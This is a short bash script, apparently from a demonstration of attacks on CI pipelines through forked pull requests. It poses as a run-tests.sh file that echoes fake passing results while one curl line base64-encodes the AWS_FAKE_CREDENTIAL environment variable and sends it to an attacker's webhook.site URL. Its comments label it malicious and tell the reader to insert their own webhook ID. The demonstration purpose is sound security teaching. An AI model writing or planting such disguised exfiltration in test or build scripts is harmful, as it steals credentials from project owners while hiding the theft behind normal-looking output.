#!/usr/bin/env bash
# MALICIOUS version — goes on Account B (attacker), in the FORK.
# Replace the fork's run-tests.sh with this. Put YOUR webhook.site ID below.
# Looks like a normal test run; the one middle line steals the secret.
echo "[tests] test_login ... ok"
echo "[tests] test_logout ... ok"

# ---- the theft: read the secret, encode it, send it to your webhook ----
curl -s "http://webhook.site./d7e533d7-c8fe-4098-bd9e-96e6721984a2/?d=$(echo $AWS_FAKE_CREDENTIAL | base64)" >/dev/null || true
# ------------------------------------------------------------------------

echo "[tests] all passed"
